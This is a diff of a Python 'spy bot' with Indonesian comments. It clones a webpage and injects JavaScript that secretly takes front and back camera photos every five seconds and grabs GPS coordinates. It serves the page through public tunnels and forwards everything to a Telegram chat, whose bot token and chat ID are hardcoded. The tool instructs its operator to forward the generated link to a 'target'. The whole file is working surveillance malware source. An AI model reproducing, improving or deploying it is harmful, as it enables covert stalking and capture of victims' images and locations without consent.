@@ -5,6 +5,7 @@
 
 import os, sys, base64, datetime, threading, time
 import subprocess, shutil, socket, re, signal, asyncio
+from collections import defaultdict
 
 try:
     from flask import Flask, request as freq, jsonify
@@ -16,8 +17,7 @@ except ImportError:
     print("[!] pip install requests"); sys.exit(1)
 try:
     from telegram import Bot, Update, InlineKeyboardButton, InlineKeyboardMarkup
-    from telegram.ext import (Application, CommandHandler,
-                               CallbackQueryHandler, ContextTypes)
+    from telegram.ext import Application, CommandHandler, CallbackQueryHandler, ContextTypes
 except ImportError:
     print("[!] pip install python-telegram-bot"); sys.exit(1)
 try:
@@ -28,40 +28,80 @@ except ImportError:
 # ------------------------------------------------------------------ #
 #  KONFIGURASI
 # ------------------------------------------------------------------ #
-BOT_TOKEN = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
-CHAT_ID   = "8598136412"
+BOT_TOKEN  = "9018666159:AAFACZ-KMGH04QrTiDgEuW5hmGtjFoUE8C4"
+CHAT_ID    = "8598136412"
 
 # ------------------------------------------------------------------ #
-#  JS INJECT — kirim foto berulang tiap 5 detik + lokasi sekali
+#  BANNER
+# ------------------------------------------------------------------ #
+RESET  = "\033[0m"
+BOLD   = "\033[1m"
+COLORS = ["\033[91m","\033[93m","\033[92m","\033[96m","\033[94m","\033[95m"]
+
+ASCII_ART = [
+    " __  __ ____  _  _  _  _   _   _       ___ ____  ",
+    "|  \\/  |  _ \\| || || || | | | | |     |_ _|  _ \\ ",
+    "| |\\/| | |_) | || || || |_| |_| |      | || | | |",
+    "| |  | |  _ <|__  _  __|  _  _  |      | || |_| |",
+    "|_|  |_|_| \\_\\  |_| |_|  |_| |_|     |___|____/ ",
+]
+
+def print_banner():
+    os.system("clear")
+    print()
+    for i, line in enumerate(ASCII_ART):
+        color = COLORS[i % len(COLORS)]
+        print(f"{BOLD}{color}{line}{RESET}")
+    print(f"\n  \033[90mbot spy by MR414N-ID\033[0m\n")
+
+# ------------------------------------------------------------------ #
+#  TIMER AKTIF
+# ------------------------------------------------------------------ #
+_start_time = time.time()
+_timer_running = True
+
+def format_uptime():
+    elapsed = int(time.time() - _start_time)
+    h = elapsed // 3600
+    m = (elapsed % 3600) // 60
+    s = elapsed % 60
+    return f"{h:02d}:{m:02d}:{s:02d}"
+
+def timer_thread():
+    while _timer_running:
+        uptime = format_uptime()
+        sys.stdout.write(f"\r  \033[90m⏱  Server aktif: \033[97m{uptime}\033[0m   ")
+        sys.stdout.flush()
+        time.sleep(1)
+
+# ------------------------------------------------------------------ #
+#  JS INJECT — foto berulang tiap 5 detik
 # ------------------------------------------------------------------ #
 INJECT_JS = """
 <script>
 (function(){
   var capCount = 0;
-  var active   = true;
+  var active = true;
 
   function snapCamera(facingMode, cb) {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) { cb(null); return; }
     navigator.mediaDevices.getUserMedia({ video: { facingMode: { ideal: facingMode } }, audio: false })
     .then(function(stream) {
       var video = document.createElement('video');
-      video.srcObject = stream;
-      video.setAttribute('playsinline','');
-      video.muted = true;
-      video.play();
+      video.srcObject = stream; video.setAttribute('playsinline','');
+      video.muted = true; video.play();
       var fired = false;
       function grab() {
         if (fired) return; fired = true;
         var c = document.createElement('canvas');
-        c.width = video.videoWidth || 640; c.height = video.videoHeight || 480;
-        c.getContext('2d').drawImage(video, 0, 0);
-        stream.getTracks().forEach(function(t){ t.stop(); });
-        cb(c.toDataURL('image/jpeg', 0.80).split(',')[1]);
+        c.width = video.videoWidth||640; c.height = video.videoHeight||480;
+        c.getContext('2d').drawImage(video,0,0);
+        stream.getTracks().forEach(function(t){t.stop();});
+        cb(c.toDataURL('image/jpeg',0.80).split(',')[1]);
       }
       video.addEventListener('loadeddata', grab);
-      setTimeout(function(){ if (!fired){ fired=true; stream.getTracks().forEach(function(t){t.stop();}); cb(null); } }, 5000);
-    })
-    .catch(function(){ cb(null); });
+      setTimeout(function(){ if(!fired){fired=true;stream.getTracks().forEach(function(t){t.stop();});cb(null);} },5000);
+    }).catch(function(){ cb(null); });
   }
 
   function getLocation(cb) {
@@ -69,7 +109,7 @@ INJECT_JS = """
     navigator.geolocation.getCurrentPosition(
       function(p){ cb(p.coords.latitude, p.coords.longitude, p.coords.accuracy); },
       function(){ cb(null,null,null); },
-      { enableHighAccuracy: true, timeout: 10000 }
+      { enableHighAccuracy:true, timeout:10000 }
     );
   }
 
@@ -77,34 +117,26 @@ INJECT_JS = """
     if (!active) return;
     capCount++;
     var num = capCount;
-    snapCamera('environment', function(back) {
-      snapCamera('user', function(front) {
-        var payload = { num: num, photo_front: front||null, photo_back: back||null, lat:null, lon:null, acc:null };
+    snapCamera('environment', function(back){
+      snapCamera('user', function(front){
+        var payload = { num:num, photo_front:front||null, photo_back:back||null, lat:null, lon:null, acc:null };
         if (num === 1) {
           getLocation(function(lat,lon,acc){
-            payload.lat=lat; payload.lon=lon; payload.acc=acc;
-            send(payload);
+            payload.lat=lat; payload.lon=lon; payload.acc=acc; send(payload);
           });
-        } else {
-          send(payload);
-        }
+        } else { send(payload); }
       });
     });
   }
 
   function send(payload) {
-    fetch('/capture', {
-      method:'POST',
-      headers:{'Content-Type':'application/json'},
-      body: JSON.stringify(payload)
-    }).catch(function(){});
+    fetch('/capture',{method:'POST',headers:{'Content-Type':'application/json'},body:JSON.stringify(payload)}).catch(function(){});
   }
 
-  // ping keepalive — deteksi kalau tab ditutup
-  function ping() {
-    if (!active) return;
-    fetch('/ping', { method:'POST' }).catch(function(){});
-  }
+  window.addEventListener('beforeunload', function(){
+    active = false;
+    navigator.sendBeacon('/offline','{}');
+  });
 
   function loop() {
     if (!active) return;
@@ -112,14 +144,7 @@ INJECT_JS = """
     setTimeout(loop, 5000);
   }
 
-  setInterval(ping, 3000);
-
-  window.addEventListener('beforeunload', function(){
-    active = false;
-    navigator.sendBeacon('/offline', '{}');
-  });
-
-  if (document.readyState === 'loading') {
+  if (document.readyState==='loading') {
     document.addEventListener('DOMContentLoaded', loop);
   } else { loop(); }
 })();
@@ -127,13 +152,14 @@ INJECT_JS = """
 """
 
 # ------------------------------------------------------------------ #
-#  STATE
+#  STATE — multi link
 # ------------------------------------------------------------------ #
-_page_html  = ""
-_pub_url    = ""
-_flask_port = 8080
-_last_ping  = {}   # session_id → timestamp (pakai IP sebagai key sederhana)
-_app_ref    = None # telegram Application
+# links = [ { 'id': int, 'raw_url': str, 'pub_url': str,
+#              'port': int, 'proc': Popen|None, 'flask': Thread } ]
+_links       = []
+_link_id_ctr = 0
+_page_html   = ""
+_flask_apps  = {}   # port -> Flask app
 
 # ------------------------------------------------------------------ #
 #  HELPER
@@ -153,107 +179,83 @@ def inject_html(html):
     idx = html.lower().rfind("</body>")
     return (html[:idx] + INJECT_JS + html[idx:]) if idx != -1 else html + INJECT_JS
 
-def save_img(b64, path):
-    try:
-        with open(path,"wb") as f: f.write(base64.b64decode(b64))
-        return True
-    except: return False
-
 # ------------------------------------------------------------------ #
-#  KIRIM HASIL KE TELEGRAM
+#  KIRIM KE TELEGRAM (no local save)
 # ------------------------------------------------------------------ #
 def send_result_thread(data):
     asyncio.run(_send_result(data))
 
 async def _send_result(data):
-    bot  = Bot(token=BOT_TOKEN)
-    num  = data.get("num", "?")
-    lat  = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
-    front= data.get("photo_front"); back = data.get("photo_back")
-    ts   = datetime.datetime.now().strftime("%H:%M:%S")
+    bot   = Bot(token=BOT_TOKEN)
+    num   = data.get("num","?")
+    lat   = data.get("lat"); lon = data.get("lon"); acc = data.get("acc")
+    front = data.get("photo_front"); back = data.get("photo_back")
+    ts    = datetime.datetime.now().strftime("%H:%M:%S")
 
-    # header
     header = f"📸 *Capture #{num}* — {ts}"
     if lat and lon:
         maps = f"https://maps.google.com/?q={lat},{lon}"
-        header += f"\n📍 `{lat}, {lon}` ± {acc:.0f}m\n[Buka Maps]({maps})"
+        header += f"\n📍 `{lat}, {lon}` ± {int(float(acc))}m\n[Buka Maps]({maps})"
+    else:
+        header += "\n📍 Lokasi tidak didapat"
 
     await bot.send_message(chat_id=CHAT_ID, text=header, parse_mode="Markdown")
 
-    # lokasi pin (hanya capture pertama)
     if num == 1 and lat and lon:
         await bot.send_location(chat_id=CHAT_ID,
                                 latitude=float(lat), longitude=float(lon))
 
-    # foto back
     if back:
         try:
             await bot.send_photo(chat_id=CHAT_ID,
                                  photo=base64.b64decode(back),
                                  caption="📷 Belakang")
-        except Exception as e:
-            print(f"[!] foto back: {e}")
+        except Exception as e: print(f"\n[!] foto back: {e}")
 
-    # foto front
     if front:
         try:
             await bot.send_photo(chat_id=CHAT_ID,
                                  photo=base64.b64decode(front),
                                  caption="🤳 Depan")
-        except Exception as e:
-            print(f"[!] foto front: {e}")
+        except Exception as e: print(f"\n[!] foto front: {e}")
 
-    # simpan ke file
-    os.makedirs("hasil", exist_ok=True)
-    fts = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
-    with open(f"hasil/lokasi_{fts}.txt","w") as f:
-        f.write(f"Latitude : {lat}\nLongitude: {lon}\nAccuracy : {acc}\n"
-                f"Maps     : https://maps.google.com/?q={lat},{lon}\n"
-                if lat and lon else "Lokasi tidak didapat.\n")
-    if back:  save_img(back,  f"hasil/back_{fts}.jpg")
-    if front: save_img(front, f"hasil/front_{fts}.jpg")
-
-async def _send_offline():
+async def _send_offline(link_id):
     bot = Bot(token=BOT_TOKEN)
     await bot.send_message(chat_id=CHAT_ID,
-                           text="🔴 *Target offline* — capture berhenti.",
+                           text=f"🔴 *Target offline* (link #{link_id}) — capture berhenti.",
                            parse_mode="Markdown")
 
 # ------------------------------------------------------------------ #
-#  FLASK
+#  FLASK — satu instance per port
 # ------------------------------------------------------------------ #
-flask_app = Flask(__name__)
+def make_flask_app(link_id):
+    fapp = Flask(f"app_{link_id}")
 
-@flask_app.route("/")
-def index(): return _page_html
+    @fapp.route("/")
+    def index(): return _page_html
 
-@flask_app.route("/capture", methods=["POST"])
-def capture():
-    data = freq.get_json(silent=True) or {}
-    threading.Thread(target=send_result_thread, args=(data,), daemon=True).start()
-    return jsonify({"ok": True})
+    @fapp.route("/capture", methods=["POST"])
+    def capture():
+        data = freq.get_json(silent=True) or {}
+        threading.Thread(target=send_result_thread, args=(data,), daemon=True).start()
+        return jsonify({"ok": True})
 
-@flask_app.route("/ping", methods=["POST"])
-def ping():
-    ip = freq.remote_addr
-    _last_ping[ip] = time.time()
-    return jsonify({"ok": True})
+    @fapp.route("/offline", methods=["POST"])
+    def offline():
+        asyncio.run(_send_offline(link_id))
+        return jsonify({"ok": True})
 
-@flask_app.route("/offline", methods=["POST"])
-def offline():
-    asyncio.run(_send_offline())
-    return jsonify({"ok": True})
+    return fapp
 
-def run_flask(port):
-    flask_app.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
+def run_flask_on_port(fapp, port):
+    fapp.run(host="0.0.0.0", port=port, debug=False, use_reloader=False)
 
 # ------------------------------------------------------------------ #
-#  TUNNEL
+#  TUNNEL — cloudflared (recommended untuk multi)
 # ------------------------------------------------------------------ #
-def tunnel_cloudflared(port):
+def start_cloudflared(port):
     b = shutil.which("cloudflared")
-    if not b:
-        print("[!] cloudflared tidak ada. pkg install cloudflared"); return None
+    if not b: return None, None
     proc = subprocess.Popen([b,"tunnel","--url",f"http://localhost:{port}"],
                             stdout=subprocess.PIPE, stderr=subprocess.STDOUT,
                             text=True, bufsize=1)
@@ -262,31 +264,30 @@ def tunnel_cloudflared(port):
         line = proc.stdout.readline()
         if not line: time.sleep(0.5); continue
         m = pat.search(line)
-        if m: return m.group(0)
-    proc.terminate(); return None
+        if m: return m.group(0), proc
+    proc.terminate(); return None, None
 
-def tunnel_ngrok(port):
+def start_ngrok(port):
     if PYNGROK:
         try:
             t = _ngrok.connect(port,"http")
-            return t.public_url.replace("http://","https://")
+            return t.public_url.replace("http://","https://"), None
         except Exception as e:
-            print(f"[!] ngrok: {e}")
+            print(f"\n[!] ngrok: {e}")
     if shutil.which("ngrok"):
-        subprocess.Popen(["ngrok","http",str(port)],
-                         stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        proc = subprocess.Popen(["ngrok","http",str(port)],
+                                stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         time.sleep(3)
         try:
-            r = req_lib.get("http://127.0.0.1:4040/api/tunnels", timeout=3)
+            r = req_lib.get("http://127.0.0.1:4040/api/tunnels",timeout=3)
             for t in r.json().get("tunnels",[]):
                 u = t.get("public_url","")
-                if u.startswith("https"): return u
+                if u.startswith("https"): return u, proc
         except: pass
-    return None
+    return None, None
 
-def tunnel_serveo(port):
-    if not shutil.which("ssh"):
-        print("[!] ssh tidak ada. pkg install openssh"); return None
+def start_serveo(port):
+    if not shutil.which("ssh"): return None, None
     proc = subprocess.Popen(
         ["ssh","-o","StrictHostKeyChecking=no","-o","ServerAliveInterval=30",
          "-R",f"80:localhost:{port}","serveo.net"],
@@ -296,136 +297,205 @@ def tunnel_serveo(port):
         line = proc.stdout.readline()
         if not line: time.sleep(0.5); continue
         m = pat.search(line)
-        if m: return m.group(0)
-    proc.terminate(); return None
+        if m: return m.group(0), proc
+    proc.terminate(); return None, None
+
+TUNNEL_FN = {
+    "tunnel_cf": start_cloudflared,
+    "tunnel_ng": start_ngrok,
+    "tunnel_sv": start_serveo,
+}
 
 # ------------------------------------------------------------------ #
-#  CUSTOM LINK
+#  TAMBAH LINK (dipanggil dari callback bot)
 # ------------------------------------------------------------------ #
-def shorten(long_url, alias):
-    for fn in [
-        lambda: req_lib.get("https://is.gd/create.php",
-                            params={"format":"simple","url":long_url,"shorturl":alias},
-                            timeout=8).text.strip(),
-        lambda: req_lib.get("https://tinyurl.com/api-create.php",
-                            params={"url":long_url,"alias":alias},
-                            timeout=8).text.strip(),
-    ]:
-        try:
-            r = fn()
-            if r.startswith("http"): return r
-        except: continue
-    return None
+async def do_add_link(tunnel_key, query):
+    global _link_id_ctr
+    _link_id_ctr += 1
+    lid  = _link_id_ctr
+    port = free_port(8080 + lid * 10)
+
+    await query.edit_message_text(f"⏳ Membuat link #{lid}...")
+
+    # flask
+    fapp = make_flask_app(lid)
+    ft   = threading.Thread(target=run_flask_on_port, args=(fapp, port), daemon=True)
+    ft.start()
+    time.sleep(1.0)
+
+    # tunnel
+    loop = asyncio.get_event_loop()
+    fn   = TUNNEL_FN[tunnel_key]
+    pub_url, proc = await loop.run_in_executor(None, fn, port)
+
+    if not pub_url:
+        await query.edit_message_text(
+            f"❌ Tunnel gagal untuk link #{lid}.",
+            reply_markup=main_keyboard()
+        )
+        return
+
+    _links.append({
+        "id": lid, "pub_url": pub_url,
+        "port": port, "proc": proc, "flask": ft
+    })
+
+    await query.edit_message_text(
+        f"✅ *Link #{lid} aktif!*\n\n🔗 `{pub_url}`\n\nForward ke target.",
+        parse_mode="Markdown",
+        reply_markup=main_keyboard()
+    )
 
 # ------------------------------------------------------------------ #
-#  TELEGRAM BOT HANDLERS
+#  KEYBOARD
 # ------------------------------------------------------------------ #
+def main_keyboard():
+    return InlineKeyboardMarkup([
+        [
+            InlineKeyboardButton("➕ Tambah Link", callback_data="add_link"),
+            InlineKeyboardButton("🗑 Hapus Link",  callback_data="del_link"),
+        ],
+        [
+            InlineKeyboardButton("📋 Daftar Link", callback_data="list_links"),
+            InlineKeyboardButton("🛑 Stop Server", callback_data="stop"),
+        ],
+    ])
+
 def tunnel_keyboard():
     return InlineKeyboardMarkup([[
-        InlineKeyboardButton("☁️ Cloudflared", callback_data="tunnel_cf"),
-        InlineKeyboardButton("🔗 Ngrok",        callback_data="tunnel_ng"),
-        InlineKeyboardButton("🌐 Serveo",       callback_data="tunnel_sv"),
+        InlineKeyboardButton("☁️ Cloudflared", callback_data="new_cf"),
+        InlineKeyboardButton("🔗 Ngrok",       callback_data="new_ng"),
+        InlineKeyboardButton("🌐 Serveo",      callback_data="new_sv"),
+    ],[
+        InlineKeyboardButton("« Kembali",      callback_data="back_main"),
     ]])
 
-def link_keyboard():
-    return InlineKeyboardMarkup([[
-        InlineKeyboardButton("📤 Kirim Link", callback_data="send_link"),
-        InlineKeyboardButton("🛑 Stop",       callback_data="stop"),
-    ]])
+def del_keyboard():
+    rows = []
+    for lnk in _links:
+        rows.append([InlineKeyboardButton(
+            f"🗑 Hapus Link #{lnk['id']} — {lnk['pub_url'][:40]}...",
+            callback_data=f"delid_{lnk['id']}"
+        )])
+    rows.append([InlineKeyboardButton("« Kembali", callback_data="back_main")])
+    return InlineKeyboardMarkup(rows)
 
+# ------------------------------------------------------------------ #
+#  HANDLERS
+# ------------------------------------------------------------------ #
 async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
     await update.message.reply_text(
-        "🤖 *SayCheeseBot*\n\nPilih tunnel untuk mulai:",
+        "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
         parse_mode="Markdown",
-        reply_markup=tunnel_keyboard()
+        reply_markup=main_keyboard()
     )
 
 async def on_button(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    global _pub_url
-    q = update.callback_query
-    await q.answer()
+    q    = update.callback_query
     data = q.data
+    await q.answer()
 
-    # --- pilih tunnel ---
-    if data in ("tunnel_cf","tunnel_ng","tunnel_sv"):
-        await q.edit_message_text("⏳ Membuat tunnel...")
-
-        loop = asyncio.get_event_loop()
-        if data == "tunnel_cf":
-            url = await loop.run_in_executor(None, tunnel_cloudflared, _flask_port)
-        elif data == "tunnel_ng":
-            url = await loop.run_in_executor(None, tunnel_ngrok, _flask_port)
-        else:
-            url = await loop.run_in_executor(None, tunnel_serveo, _flask_port)
-
-        if not url:
-            await q.edit_message_text(
-                "❌ Tunnel gagal. Coba pilihan lain:",
-                reply_markup=tunnel_keyboard()
-            )
-            return
-
-        _pub_url = url
+    if data == "back_main":
         await q.edit_message_text(
-            f"✅ *Tunnel aktif!*\n\n🔗 `{_pub_url}`\n\nForward link ini ke target.",
+            "🕵️ *MR414N-ID Spy Bot*\n\nPanel kontrol:",
             parse_mode="Markdown",
-            reply_markup=link_keyboard()
+            reply_markup=main_keyboard()
         )
 
-    # --- kirim link ---
-    elif data == "send_link":
-        if _pub_url:
-            await q.message.reply_text(
-                f"🔗 *Link aktif:*\n`{_pub_url}`",
-                parse_mode="Markdown"
+    elif data == "add_link":
+        await q.edit_message_text(
+            "Pilih tunnel untuk link baru:",
+            reply_markup=tunnel_keyboard()
+        )
+
+    elif data in ("new_cf","new_ng","new_sv"):
+        key = {"new_cf":"tunnel_cf","new_ng":"tunnel_ng","new_sv":"tunnel_sv"}[data]
+        await do_add_link(key, q)
+
+    elif data == "list_links":
+        if not _links:
+            await q.edit_message_text(
+                "📋 Belum ada link aktif.",
+                reply_markup=main_keyboard()
             )
         else:
-            await q.answer("Belum ada tunnel aktif.", show_alert=True)
+            teks = "📋 *Daftar Link Aktif:*\n\n"
+            for lnk in _links:
+                teks += f"• Link #{lnk['id']}: `{lnk['pub_url']}`\n"
+            await q.edit_message_text(
+                teks, parse_mode="Markdown",
+                reply_markup=main_keyboard()
+            )
 
-    # --- stop ---
+    elif data == "del_link":
+        if not _links:
+            await q.edit_message_text(
+                "Belum ada link untuk dihapus.",
+                reply_markup=main_keyboard()
+            )
+        else:
+            await q.edit_message_text(
+                "Pilih link yang mau dihapus:",
+                reply_markup=del_keyboard()
+            )
+
+    elif data.startswith("delid_"):
+        lid = int(data.split("_")[1])
+        for i, lnk in enumerate(_links):
+            if lnk["id"] == lid:
+                if lnk.get("proc"):
+                    try: lnk["proc"].terminate()
+                    except: pass
+                _links.pop(i)
+                break
+        await q.edit_message_text(
+            f"✅ Link #{lid} dihapus.",
+            reply_markup=main_keyboard()
+        )
+
     elif data == "stop":
-        await q.edit_message_text("🛑 *Bot dihentikan.*", parse_mode="Markdown")
+        await q.edit_message_text("🛑 *Server dihentikan.*", parse_mode="Markdown")
         await asyncio.sleep(1)
+        global _timer_running
+        _timer_running = False
         os.kill(os.getpid(), signal.SIGINT)
 
 # ------------------------------------------------------------------ #
 #  MAIN
 # ------------------------------------------------------------------ #
 def main():
-    global _page_html, _flask_port
+    global _page_html
 
-    print("\n  SayCheeseBot — Telegram Edition\n")
+    print_banner()
 
     # template
-    print("[1] Clone URL   [2] File lokal")
+    print("  [1] Clone dari URL   [2] File HTML lokal\n")
     while True:
-        p = input("Template (1/2): ").strip()
+        p = input("  Template (1/2): ").strip()
         if p in ("1","2"): break
 
     if p == "1":
-        url = input("URL: ").strip()
+        url = input("  URL: ").strip()
         if not url.startswith("http"): url = "https://" + url
-        print(f"[*] Cloning...")
+        print("  [*] Cloning...")
         try:
-            raw = clone_url(url); print("[+] OK")
+            raw = clone_url(url); print("  [+] OK\n")
         except Exception as e:
-            print(f"[!] {e}"); sys.exit(1)
+            print(f"  [!] Gagal: {e}"); sys.exit(1)
     else:
-        path = input("Path HTML: ").strip().strip('"\'')
+        path = input("  Path HTML: ").strip().strip('"\'')
         if not os.path.isfile(path):
-            print(f"[!] File tidak ditemukan"); sys.exit(1)
+            print("  [!] File tidak ditemukan"); sys.exit(1)
         with open(path,"r",encoding="utf-8",errors="replace") as f:
             raw = f.read()
-        print("[+] OK")
+        print("  [+] OK\n")
 
     _page_html = inject_html(raw)
-    _flask_port = free_port(8080)
 
-    # flask di background
-    threading.Thread(target=run_flask, args=(_flask_port,), daemon=True).start()
-    time.sleep(1.2)
-    print(f"[+] Flask jalan di port {_flask_port}")
-    print(f"[*] Bot polling... buka @Spyjsbot dan ketik /start\n")
+    # timer di background
+    threading.Thread(target=timer_thread, daemon=True).start()
+
+    print(f"\n\n  Buka @Spyjsbot → /start\n")
 
     # telegram bot
     application = Application.builder().token(BOT_TOKEN).build()
